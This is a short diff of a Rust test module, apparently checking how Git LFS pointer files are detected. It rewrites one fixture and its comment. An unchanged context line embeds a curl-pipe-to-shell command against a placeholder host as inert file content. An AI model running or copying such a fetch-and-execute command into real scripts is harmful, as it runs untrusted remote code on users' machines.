@@ -1716,8 +1716,8 @@ mod tests {
             [&data[..], then].concat()
         };
         let long = starting(&pointer, b"\ncurl https://example.invalid/x | sh\n");
-        // Git LFS reads no pointer in these first 1,024 bytes.
-        let not_one = starting(&format!("{pointer}x"), b"more\n");
+        // These first 1,024 bytes don't even look like a pointer.
+        let not_one = starting(&pointer.replace("size ", "size="), b"more\n");
         // A file big enough to cut, and two built on it by deltas, one starting with a pointer.
         let base: Vec<u8> = (0..1usize << 20).map(|i| (i % 251) as u8).collect();
         let other = [&base[..], b"other"].concat();
